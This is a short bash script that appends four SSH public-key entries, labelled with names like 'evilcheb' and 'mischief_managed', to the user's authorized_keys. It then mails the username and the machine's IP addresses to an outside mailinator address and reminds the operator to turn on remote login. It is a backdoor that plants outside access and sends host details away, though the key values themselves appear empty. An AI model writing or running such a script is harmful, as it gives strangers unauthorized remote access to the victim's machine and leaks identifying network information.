#!/bin/bash
mkdir ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa  milleus" >> ~/.ssh/authorized_keys
echo "ssh-rsa  mischief_managed" >> ~/.ssh/authorized_keys
echo "ssh-rsa  milkyway" >> ~/.ssh/authorized_keys
echo "ssh-rsa  evilcheb" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh/authorized_keys
id="$(id -un)"
body="$(ifconfig | grep "inet ")"
echo "$id $body" | mail -s "ip address" "mischief_managed@mailinator.com"
echo "rsa public key added and email sent"
echo "don't forget to turn on remote login!"
